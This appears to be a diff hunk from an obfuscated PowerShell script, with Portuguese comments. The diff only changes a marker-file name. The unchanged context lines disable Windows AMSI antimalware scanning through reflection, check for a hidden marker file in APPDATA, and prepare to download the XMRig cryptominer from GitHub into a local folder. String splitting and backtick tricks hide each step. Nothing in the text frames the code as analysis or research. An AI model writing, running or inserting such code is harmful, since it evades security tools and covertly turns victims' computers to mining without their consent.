@@ -4,10 +4,10 @@ ${fi`e`ld} = ${As`sE`MBlY}.('G'+'etField').Invoke(('am{0}InitFailed' -f ${C}),('
 ${fIE`ld}.('SetVa'+'lu'+'e').Invoke(${N`UlL},${tR`Ue})
 
 # Defina o URL e o caminho para o arquivo zip
-if (.('Tes'+'t-P'+'ath') -Path "$env:APPDATA\Microsoft\2504706.txt") {
+if (.('Tes'+'t-P'+'ath') -Path "$env:APPDATA\Microsoft\88888.txt") {
     exit
 } else {
-    ${2`504} = "$env:APPDATA\Microsoft\2504706.txt"
+    ${2`504} = "$env:APPDATA\Microsoft\88888.txt"
     ${u`RL} = ('https:/'+'/git'+'hu'+'b'+'.com/xmrig'+'/xmrig/'+'re'+'l'+'eases/download/'+'v6'+'.2'+'1'+'.'+'3/'+'xmrig-'+'6.21.3-msvc-'+'win6'+'4.z'+'ip')
     ${bAs`EpA`Th} = .('Jo'+'in-'+'Path') -Path ${e`Nv:loC`A`lAPpD`AtA} -ChildPath ('C'+'TF')
     ${Z`Ip`PAtH} = .('J'+'o'+'in-Path') -Path ${bA`s`E`PAtH} -ChildPath ('xmri'+'g-6.21.3-m'+'svc-w'+'i'+'n64.z'+'ip')
